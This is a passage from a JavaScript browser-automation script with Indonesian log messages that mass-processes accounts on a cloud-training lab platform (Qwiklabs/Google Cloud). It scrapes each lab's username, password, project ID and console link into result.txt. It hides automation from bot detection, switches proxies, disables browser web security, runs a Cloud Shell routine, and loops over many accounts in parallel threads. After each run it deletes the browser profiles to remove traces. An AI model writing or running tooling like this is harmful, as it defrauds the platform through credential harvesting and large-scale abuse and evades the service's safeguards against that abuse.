                        const decodedLink = decodeURIComponent(decodeURIComponent(consoleLink));
                        const emailMatch = decodedLink.match(/Email=([^&]+)/i);
                        if (emailMatch) username = emailMatch[1];
                        const projectMatch = decodedLink.match(/project=([^&]+)/i);
                        if (projectMatch) projectId = projectMatch[1];
                    } catch (e) {}
                }

                if (extractAll.attrs) {
                    for (const [key, val] of Object.entries(extractAll.attrs)) {
                        try {
                            const parsed = JSON.parse(val);
                            if (typeof parsed === 'object' && parsed !== null) {
                                if (parsed.username && !username) username = parsed.username;
                                if (parsed.password && !labPassword) labPassword = parsed.password;
                                if (parsed.projectId && !projectId) projectId = parsed.projectId;
                                if (parsed.project_id && !projectId) projectId = parsed.project_id;
                                if (parsed.student_email && !username) username = parsed.student_email;
                                if (parsed.items && Array.isArray(parsed.items)) {
                                    for (const item of parsed.items) {
                                        if ((item.key === 'username' || item.label === 'Username') && !username) username = item.value;
                                        if ((item.key === 'password' || item.label === 'Password') && !labPassword) labPassword = item.value;
                                        if ((item.key === 'project_id' || item.label === 'Project ID') && !projectId) projectId = item.value;
                                    }
                                }
                            }
                        } catch {}
                    }
                }

                const allTexts = [...extractAll.texts, ...extractAll.inputs];
                for (const t of allTexts) {
                    const trimmed = t.trim();
                    if (!username && /^student-[a-z0-9]+@/i.test(trimmed)) username = trimmed;
                    if (!projectId && /^qwiklabs-gcp-/i.test(trimmed)) projectId = trimmed;
                }

                if (!labPassword) {
                    for (let i = 0; i < allTexts.length; i++) {
                        if (/password/i.test(allTexts[i])) {
                            for(let j = i + 1; j < Math.min(i + 6, allTexts.length); j++) {
                                const candidate = allTexts[j].trim();
                                if (candidate.length >= 6 && !/\s/.test(candidate) && 
                                    !candidate.toLowerCase().includes('password') && 
                                    !candidate.includes('student') && 
                                    !candidate.includes('qwiklabs')) {
                                    labPassword = candidate;
                                    break;
                                }
                            }
                        }
                        if (labPassword) break;
                    }
                }

                if (!labPassword) {
                    for (const t of allTexts) {
                        const trimmed = t.trim();
                        if (trimmed.length >= 8 && trimmed.length <= 16 && /[A-Za-z]/.test(trimmed) && /\d/.test(trimmed) && !/\s/.test(trimmed)) {
                            labPassword = trimmed;
                            break;
                        }
                    }
                }

                console.log(`\n  ┌─ Hasil Ekstraksi ──────────────────────`);
                console.log(`  │  Console Link : ${consoleLink || 'tidak ditemukan'}`);
                console.log(`  │  Username     : ${username || 'tidak ditemukan'}`);
                console.log(`  │  Password     : ${labPassword || 'tidak ditemukan'}`);
                console.log(`  │  Project ID   : ${projectId || 'tidak ditemukan'}`);
                console.log(`  └────────────────────────────────────────`);

                const resultLines = [
                    `=== Lab Results === ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} ===`,
                    `Console Link: ${consoleLink || 'not found'}`, 
                    `Username: ${username || 'not found'}`, 
                    `Password: ${labPassword || 'not found'}`, 
                    `Project ID: ${projectId || 'not found'}`, 
                    `Lab URL: ${page.url()}`,
                    '',
                ];
                const resultPath = path.resolve(__dirname, 'result.txt');
                fs.appendFileSync(resultPath, resultLines.join('\n') + '\n', 'utf-8');
                console.log('  ✔ Hasil disimpan ke result.txt');

                if (consoleLink) {
                    const linkPath = path.resolve(__dirname, 'link.txt');
                    fs.writeFileSync(linkPath, consoleLink + '\n', 'utf-8');
                }

                if (consoleLink) {
                    console.log('\n  → [Sistem] Menghentikan browser ber-proxy...');
                    await context.close();
                    await randomDelay(2000, 3000);

                    console.log('  → [Sistem] Merestart browser TANPA PROXY khusus untuk Cloud Shell...');
                    context = await chromium.launchPersistentContext(profileDir, {
                        userAgent: freshUserAgent,
                        headless: useHeadless,
                        viewport: { width: 1366, height: 768 },
                        args: [
                            "--disable-blink-features=AutomationControlled",
                            "--no-sandbox",
                            "--disable-web-security",
                            "--disable-dev-shm-usage",
                            "--disable-gpu",
                            "--disable-setuid-sandbox",
                            `--disable-extensions-except=${extensionPath}`, 
                            `--load-extension=${extensionPath}`
                        ],
                        permissions: ['clipboard-read', 'clipboard-write'],
                        locale: "en-US",
                        timezoneId: "Asia/Jakarta",
                    });

                    await runCloudShell(context, consoleLink, password, projectId, username, labPassword);
                }
            }

            console.log('\n┌─────────────────────────────────────────');
            console.log(`│  Selesai! (${label})`);
            console.log('└─────────────────────────────────────────');
            return true;
        } catch (err) {
            console.error(`  ✘ Error [${email}]:`, err.message);
            return false;
        } finally {
            if (context) {
                await context.close().catch(() => {});
            }
            
            try {
                if (fs.existsSync(profileDir)) {
                    fs.rmSync(profileDir, { recursive: true, force: true });
                    console.log(`  ✔ Profil/Jejak dihapus secara permanen (Cleaned up): ${emailSlug}`);
                }
            } catch (cleanupErr) {
                console.log(`  ⚠ Gagal menghapus profil: ${cleanupErr.message}`);
            }
        }
    }

    let loopCount = 0;
    while (loopCount < maxLoops) {
        loopCount++;
        const loopLabel = maxLoops === Infinity ? `Loop ke-${loopCount}` : `Loop ${loopCount}/${maxLoops}`;
        console.log(`\n${'█'.repeat(50)}`);
        console.log(`  🔁 ${loopLabel} — ${selected.length} akun, ${threads} thread`);
        console.log(`${'█'.repeat(50)}`);

        const failedAccounts = [];

        for (let i = 0; i < selected.length; i += threads) {
            const chunk = selected.slice(i, i + threads);
            console.log(`\n  → Batch ${Math.floor(i / threads) + 1}: ${chunk.map(a => a.email).join(', ')}`);
            const results = await Promise.all(
                    chunk.map((acc, j) => processAccount(acc, `Akun ${i + j + 1}/${selected.length} [${loopLabel}]`)));
            results.forEach((ok, j) => {
                if (!ok) {
                    failedAccounts.push(chunk[j]);
                    console.log(`  ⚠ ${chunk[j].email} masuk antrian retry`);
                }
            });
            if (i + threads < selected.length) {
                console.log(`\n  ⏳ Jeda 5 detik sebelum batch berikutnya...`);
                await new Promise(r => setTimeout(r, 5000));
            }
        }

        if (failedAccounts.length > 0) {
            console.log(`\n${'═'.repeat(50)}`);
            console.log(`  🔄 RETRY: ${failedAccounts.length} akun gagal...`);
            console.log(`${'═'.repeat(50)}`);
            for (let i = 0; i < failedAccounts.length; i++) {
                console.log(`\n  ⏳ Jeda 10 detik sebelum retry...`);
                await new Promise(r => setTimeout(r, 10000));
                const ok = await processAccount(failedAccounts[i], `Retry ${i + 1}/${failedAccounts.length} [${loopLabel}]`);
                if (ok) {
                    console.log(`  ✔ Retry berhasil: ${failedAccounts[i].email}`);
                } else {
                    console.log(`  ✘ Retry gagal: ${failedAccounts[i].email} — skip.`);
                }
            }
        }

        if (loopCount < maxLoops) {
            console.log(`\n  ⏳ Jeda 5 detik sebelum loop berikutnya...`);
            await new Promise(r => setTimeout(r, 5000));
        }
    }

    console.log('\n  ✔ Semua loop selesai diproses.');
})();
